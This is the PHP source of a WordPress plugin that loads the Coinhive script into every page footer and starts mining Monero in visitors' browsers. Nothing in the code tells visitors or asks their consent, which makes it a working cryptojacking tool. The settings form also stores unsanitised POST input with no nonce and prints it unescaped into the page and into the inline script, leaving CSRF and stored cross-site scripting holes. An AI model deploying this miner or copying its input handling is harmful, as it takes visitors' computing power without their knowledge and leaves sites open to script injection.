<?php
/*
Plugin Name: Coinhive WordPress
Plugin URI: http://blockchaindevs.shop
Description: Coinhive is a JS tool to have the visitors of your site mine Monero in the background. This is a WordPress plugin to get it on your site easily.
Version: 1.0.0
Author: Blockchain Devs
Author URI: http://blockchaindevs.shop
License: GPLv2 or later
*/

function coinhive_wordpress_add_javascript() {
	$value = get_option('coinhive_sitekey', 'hey-ho');
?>

<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
	var miner = new CoinHive.User('<?php
echo $value; ?>', 'john-doe');
	miner.start();
</script>

<?php
}

add_action('wp_footer', 'coinhive_wordpress_add_javascript');


function coinhive_settings_display() {
	
	if (isset($_POST['coinhive_sitekey'])) {
        update_option('coinhive_sitekey', $_POST['coinhive_sitekey']);
        $value = $_POST['coinhive_sitekey'];
    } 

    $value = get_option('coinhive_sitekey', 'hey-ho');
	
    echo '<h1>Coinhive Settings</h1>';
    echo '<form method="POST">';
    echo '<label>Site Key</label><input type="text" name="coinhive_sitekey" value="'.$value.'" />';
    echo '<input type="submit" value="Save" class="button button-primary button-large">';
    echo '</form>';
}

function coinhive_settings_create() {
    add_menu_page( 'Coinhive Settings', 'Coinhive Settings', 'manage_options', 'coinhive_settings', 'coinhive_settings_display', '');
}
add_action('admin_menu', 'coinhive_settings_create');